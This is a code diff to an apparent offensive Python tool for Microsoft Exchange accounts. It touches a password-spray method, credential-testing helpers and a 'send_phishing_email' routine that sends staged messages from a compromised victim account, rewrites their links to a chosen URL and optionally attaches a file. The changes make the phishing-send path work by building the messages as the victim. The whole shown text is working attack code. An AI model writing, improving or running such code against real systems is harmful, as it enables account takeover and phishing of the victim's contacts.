@@ -95,6 +95,8 @@ class Session:
 
         if is_valid_account:
             self._validated_cred = True
+        else:
+            self._validated_cred = False
         return account
 
     def pass_spray(self, pass_file):
@@ -142,8 +144,6 @@ class Session:
             attachment = FileAttachment(name=file_name, content=f.read())
             message.attach(attachment)
 
-        print("Debugging: This is the file:")
-        print(attachment)
         return message
 
     def search_keyword(self, keyword, folder="inbox"):
@@ -271,14 +271,7 @@ class Session:
         # Copy all of the saved messages into the specified folder
         for email in emails:
             print('Sending: "' + email.subject + '" to ' + str(email.to_recipients))
-
-            m = Message(
-                account=self._victim_account,
-                subject=email.subject,
-                body=email.body,
-                to_recipients=email.to_recipients
-                )
-            m.send()
+            email.send()
 
     def send_phishing_email(self, link_replace=True, link='https://www.basspro.com', attach_file=False, file_path='', file_name='Resume'):
         """Send phishing emails from a compromised account.
@@ -291,35 +284,46 @@ class Session:
         """
 
         # Find the correct folder in the red_account
-        emails = []
+        old_emails = []
         for folder in self._red_account.inbox.children:
 
             if folder.name == self.full_username:
                 for sub_folder in folder.children:
                     if sub_folder.name == "to_send":
-                        emails = [email for email in sub_folder.all()]
+                        old_emails = [email for email in sub_folder.all()]
                         break
                 break
 
         # Iterate through emails and either replace links or attach files
-        for email in emails:
+        new_emails = []
+        for email in old_emails:
+            m = Message(
+                account=self._victim_account,
+                subject=email.subject,
+                body=email.body,
+                to_recipients=email.to_recipients
+                )
+
             # Replace links
             if link_replace:
                 replace_string = 'href="' + link + '"'
-                email.body = HTMLBody(re.sub(r'href="\S*"', replace_string, email.body))
+                m.body = HTMLBody(re.sub(r'href="\S*"', replace_string, m.body))
 
             # Attach file
             if attach_file:
-                print("Debugging: File is being attached!!!")
-                email = self.attach_file(email, file_path, file_name)
+                m = self.attach_file(m, file_path, file_name)
+
+            new_emails.append(m)
 
         print("Sending emails from the victim... ")
 
-        self.vic_send_emails(emails)
+
+        self.vic_send_emails(new_emails)
 
     @classmethod
     def ews_config_setup(cls, user, domain, password):
         """Authenticates with Outlook EWS and returns the account objected created with the passed credentials.
+        (From: "https://github.com/mikesiegel/ews-crack")
 
         :param user:     (String) the user you wish to authenticate, (for the email 'test@testing.com', just pass 'test' as the user)
         :param domain:   (String) the domain of the user to authenticate
@@ -381,6 +385,7 @@ class Session:
     @classmethod
     def test_single_mode(cls, username, domain, password):
         """Attempts to login to an account using a single username/password.
+        (From: "https://github.com/mikesiegel/ews-crack")
 
         :param username: (string)  the username of the account to login as
         :param password: (string)  the password of the account to login as
